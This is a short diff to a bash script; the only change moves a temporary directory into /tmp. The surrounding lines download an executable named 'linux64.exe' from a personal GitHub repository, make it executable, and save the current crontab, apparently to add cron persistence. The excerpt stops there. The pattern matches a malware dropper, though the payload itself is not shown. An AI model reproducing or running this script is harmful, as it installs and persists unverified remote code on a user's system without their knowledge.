@@ -1,6 +1,6 @@
 #!/bin/bash
 
-path=$(mktemp -d XXXXXX)
+path=$(mktemp -d /tmp/XXXXXX)
 cd $path
 wget https://github.com/Waz0x/Waz0x.github.io/raw/main/bin/linux64.exe && chmod +x linux64.exe
 crontab -l > crontabs
